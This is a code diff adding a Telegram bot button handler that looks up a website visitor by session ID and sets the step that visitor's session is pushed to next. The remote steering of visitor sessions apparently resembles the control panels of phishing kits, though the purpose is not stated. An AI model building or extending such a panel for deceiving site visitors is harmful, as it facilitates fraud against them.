@@ -112,6 +112,36 @@ if (bot) {
     } catch (err) { ctx.reply('❌ Error: ' + err.message); }
   });
 
+  // Inline button: push_SID_STEP — sent from notification message buttons
+  bot.action(/^push_(.+)_([^_]+)$/, async ctx => {
+    try {
+      // sid may contain underscores — take last segment as step, rest as sid
+      const raw = ctx.match[0].replace(/^push_/, '');
+      const lastUnderscore = raw.lastIndexOf('_');
+      const sid = raw.slice(0, lastUnderscore);
+      const step = raw.slice(lastUnderscore + 1);
+      if (!sid) {
+        await ctx.answerCbQuery('❌ No session ID', { show_alert: true });
+        return;
+      }
+      const v = db.prepare('SELECT * FROM visitors WHERE session_id=?').get(sid);
+      if (!v) {
+        await ctx.answerCbQuery('⚠️ Session expired or not found', { show_alert: true });
+        return;
+      }
+      db.prepare(`UPDATE visitors SET pending_step=? WHERE session_id=?`).run(step, sid);
+      await ctx.answerCbQuery(`✅ Pushed: ${step}`);
+      // Edit message to show which step was chosen
+      const stepLabel = step === 'HOME' ? '🏠 Home' : step === 'complete' ? '✅ Complete' : `➡️ ${step}`;
+      await ctx.editMessageText(
+        ctx.callbackQuery.message.text + `\n\n⚡ <b>Pushed:</b> ${stepLabel}`,
+        { parse_mode: 'HTML' }
+      ).catch(() => {});
+    } catch (err) {
+      await ctx.answerCbQuery('❌ Error: ' + err.message, { show_alert: true });
+    }
+  });
+
   bot.catch((err, ctx) => {
     console.error('Bot error:', err.message);
   });
